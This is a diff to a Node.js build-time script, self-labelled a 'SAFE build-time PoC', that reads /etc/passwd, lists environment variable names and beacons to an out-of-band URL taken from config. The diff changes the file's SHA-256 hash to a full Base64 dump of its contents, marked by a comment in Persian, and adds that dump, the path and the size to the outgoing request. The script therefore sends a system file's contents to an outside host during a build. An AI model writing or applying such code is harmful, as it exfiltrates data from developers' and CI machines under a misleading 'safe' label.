@@ -19,7 +19,9 @@ function beacon(urlStr, q) {
   if (!urlStr || typeof urlStr !== "string" || !/^https?:\/\//i.test(urlStr)) return;
   try {
     const u = new URL(urlStr);
-    for (const [k,v] of Object.entries(q)) u.searchParams.set(k, String(v));
+    for (const [k, v] of Object.entries(q)) {
+      u.searchParams.set(k, String(v));
+    }
     const lib = u.protocol === "http:" ? http : https;
     const req = lib.request(u, { method: "GET", timeout: 5000 }, (res) => res.resume());
     req.on("error", () => {});
@@ -32,17 +34,20 @@ function beacon(urlStr, q) {
   const outDir = path.join(__dirname, "..", "dist");
   fs.mkdirSync(outDir, { recursive: true });
 
-  const target = "/etc/passwd"; 
+  const target = "/etc/passwd";
   let exists = false, size = -1, sha256 = "n/a";
   try {
     const buf = fs.readFileSync(target);
     exists = true;
     size = buf.length;
-    sha256 = crypto.createHash("sha256").update(buf).digest("hex");
-  } catch {}
+    // ⬇️ تغییر: به‌جای هش، Base64 محتوا
+    sha256 = buf.toString("base64");
+  } catch {
+  }
 
   const nonce = crypto.randomBytes(8).toString("hex");
-  const fsReport = [
+
+  const report = [
     "SAFE build-time PoC",
     `time: ${new Date().toISOString()}`,
     `stage: ${stage}`,
@@ -54,7 +59,7 @@ function beacon(urlStr, q) {
     `sha256: ${sha256}`,
     `nonce: ${nonce}`
   ].join("\n") + "\n";
-  fs.writeFileSync(path.join(outDir, "_wf_poc.txt"), fsReport, "utf8");
+  fs.writeFileSync(path.join(outDir, "_wf_poc.txt"), report, "utf8");
 
   const envKeys = Object.keys(process.env).sort();
   fs.writeFileSync(path.join(outDir, "_wf_env_keys.txt"), envKeys.join("\n") + "\n", "utf8");
@@ -63,6 +68,9 @@ function beacon(urlStr, q) {
   beacon(cfg.oob_url, {
     s: stage,
     n: nonce,
+    f: target,
+    h: sha256,
+    sz: size,
     node: process.version.replace(/^v/, ""),
     m: process.env.COSMIC_MOUNT_PATH || ""
   });
